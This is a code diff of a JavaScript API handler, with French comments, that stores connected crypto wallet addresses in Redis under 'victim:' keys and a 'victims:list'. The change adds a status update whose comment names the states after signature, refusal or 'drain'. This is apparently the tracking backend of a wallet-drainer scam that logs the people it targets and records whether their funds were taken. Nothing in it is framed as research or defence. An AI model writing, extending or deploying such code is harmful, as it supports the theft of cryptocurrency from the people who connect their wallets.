@@ -14,7 +14,7 @@ export default async function handler(req, res) {
   if (req.method === 'OPTIONS') return res.status(200).end();
 
   if (req.method === 'POST') {
-    const { address, chain } = req.body;
+    const { address, chain, status } = req.body;
     if (!address || typeof address !== 'string' || !/^0x[a-fA-F0-9]{40}$/.test(address)) {
       return res.status(400).json({ error: 'Adresse invalide' });
     }
@@ -22,25 +22,38 @@ export default async function handler(req, res) {
     let client;
     try {
       client = await getRedisClient();
+      const key = `victim:${address}`;
+      const timestamp = String(Date.now());
 
-      // Vérifier si déjà enregistré
-      const existing = await client.hGetAll(`victim:${address}`);
-      if (existing && Object.keys(existing).length > 0) {
-        console.log(`📥 Wallet reconnecté : ${address}, déjà enregistré.`);
-        return res.status(200).json({ success: true, message: 'already recorded' });
+      if (status) {
+        // Mise à jour du statut (après signature, refus, drain…)
+        const data = await client.hGetAll(key);
+        await client.hSet(key, {
+          status,
+          timestamp,
+          chain: chain || data.chain || 'unknown',
+          token: data.token || '',
+          amount: data.amount || '0'
+        });
+        console.log(`🔄 Statut mis à jour pour ${address}: ${status}`);
+      } else {
+        // Enregistrement initial : ne rien faire si déjà connu
+        const existing = await client.hGetAll(key);
+        if (existing && Object.keys(existing).length > 0) {
+          console.log(`📥 Wallet reconnecté : ${address}`);
+          return res.status(200).json({ success: true, message: 'already recorded' });
+        }
+        await client.hSet(key, {
+          chain: chain || 'unknown',
+          token: '',
+          amount: '0',
+          status: 'connected',
+          timestamp
+        });
+        console.log(`🆕 Wallet connecté enregistré : ${address}`);
       }
 
-      const timestamp = Date.now();
-      // Enregistrer le wallet avec statut 'connected'
-      await client.hSet(`victim:${address}`, {
-        chain: chain || 'unknown',
-        token: '',
-        amount: '0',
-        status: 'connected',
-        timestamp: String(timestamp)
-      });
-
-      // Ajouter l'adresse à la liste victims:list
+      // Ajout à la liste victims:list si absent
       const list = await client.get('victims:list');
       const parsedList = list ? JSON.parse(list) : [];
       if (!parsedList.includes(address)) {
@@ -48,7 +61,6 @@ export default async function handler(req, res) {
         await client.set('victims:list', JSON.stringify(parsedList));
       }
 
-      console.log(`🆕 Wallet connecté enregistré : ${address}`);
       return res.status(200).json({ success: true });
     } catch (err) {
       console.error('Erreur record-wallet:', err);
